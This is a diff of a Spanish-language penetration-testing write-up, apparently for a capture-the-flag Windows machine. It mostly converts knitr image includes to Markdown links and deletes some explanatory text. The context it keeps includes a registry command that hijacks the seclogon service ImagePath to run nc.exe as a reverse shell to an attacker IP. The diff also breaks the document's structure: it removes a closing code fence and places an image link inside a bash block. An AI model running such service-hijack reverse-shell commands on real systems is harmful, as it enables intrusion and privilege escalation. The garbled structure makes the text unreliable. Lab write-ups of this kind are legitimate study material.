@@ -114,10 +114,8 @@ Una vez el burpsuite configurado con la maquina victima de target, vamos a añad
 1. Pinchamos a Proxy > Options
 1. Add Match and Replace
 
-    ```{r, echo = FALSE, fig.cap="Azure DevOps repositories", out.width="90%"}
-        knitr::include_graphics("images/Control-burp-xforwardingfor.png")
-    ```
 
+![Cotrol-bur-xforwardifor](../assets/images/Control-burp-xforwardingfor.png) 
 1. Interceptamos y vemos que se añade la cabezera
 1. Desactivamos el intersepte 
 
@@ -475,10 +473,8 @@ El winpeas.exe nos reporta que el usuario Hector tiene fullControl sobre bastant
 
 ```{r, echo = FALSE, fig.cap="Hector service fullControl", out.width="90%"}
     knitr::include_graphics("images/Control-Hector-services-fullControl.png")
-```
 
-Si lanzamos el commando `sc query seclogon` vemos que el servicio esta apagado pero podriamos lanzarlo configurando la manera que queremos que arranque.
-
+![Cotrol-Hector-services-fullCotrol](../assets/images/Control-Hector-services-fullControl.png) 
 ```bash
 reg query "HKLM\system\currentcontrolset\services\seclogon"
 ```
@@ -487,10 +483,8 @@ reg query "HKLM\system\currentcontrolset\services\seclogon"
     knitr::include_graphics("images/Control-reg_expand_sz.png")
 ```
 
-La idea aqui es que el **ImagePath**, mejor dicho el svchost.exe se ejecuta directamente a la hora que lanzamos el servicio y este binario esta ejecutado
-por el usuario administrador. La idea aqui es tomar el control del **ImagePath** para que valga otra cosa.
-
 ```bash
+![Cotrol-re_exad_sz](../assets/images/Control-reg_expand_sz.png) 
 reg add "HKLM\system\currentcontrolset\services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.15 443" /f
 ```
 
